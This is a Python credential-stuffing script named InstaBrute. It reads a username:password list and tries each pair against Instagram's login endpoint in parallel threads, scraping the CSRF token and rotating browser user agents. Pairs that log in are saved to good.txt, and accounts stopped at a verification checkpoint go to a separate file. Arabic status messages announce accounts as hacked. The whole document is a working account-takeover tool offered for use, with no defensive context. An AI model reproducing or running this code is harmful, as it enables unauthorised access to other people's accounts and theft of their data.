from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
from time import sleep
CheckVersion = str(sys.version)
import webbrowser
import re
from bs4 import BeautifulSoup
import json, random, re, requests
from datetime import datetime
normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"






class InstaBrute(object):
    def __init__(self):
        self.cls()
        try:
            Combo = input('List File : ')
            self.cls()
        except:
            self.cls()
            print('[-] Error : SomeThing Not true!')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:

            falah = combo.split(':')[0]
            password = combo.split(':')[1]

            t = threading.Thread(target=self.New_Br, args=(falah, password))
            t.start()
            thread.append(t)
            time.sleep(4)

        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

         


    def New_Br(self,falah,password):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"
        ]
        time = int(datetime.now().timestamp())
        payload = {
            'username': falah,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        USER_AGENT = headers_list[random.randrange(0,4)]
        with requests.Session() as s:
            session = requests.Session()
            s.headers= {"user-agent":USER_AGENT}	
            req = session.get(link)    
            soup = BeautifulSoup(req.content, 'html.parser')    
            body = soup.find('body')
            pattern = re.compile('window._sharedData')
            script = body.find("script", text=pattern)
            script = script.get_text().replace('window._sharedData = ', '')[:-1]
            data = json.loads(script)
            csrf = data['config'].get('csrf_token')
					
            r = s.post(login_url, data=payload, headers={
                "User-Agent": USER_AGENT ,
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(whiteB_color+ '' + f'\n----------------------------------------------')
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            if 'error' in r.text:
                print((normal_color+'|| ' + 'عذرا ، كانت هناك مشكلة في طلبك ')) 
                print(green_color+'|| ' + current_time)
                print(r.text)
            if 'authenticated": true' in r.text:
                print((green_color + ' || ' + falah + ':' + password + ' --> ! تم الاختراق'))
                with open('good.txt', 'a') as x:
                    x.write(falah + ' : ' + password + '\n')
            elif 'checkpoint_required' in r.text:   
                print((green_color + ' || ' + falah + ' : ' + password + ' -->  عليه رمز تحقق!'))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(falah + ':' + password + '\n')
            else:
                print((red_color + '|| ' + falah + ' : ' + password + ' --> No!'))
                





InstaBrute()


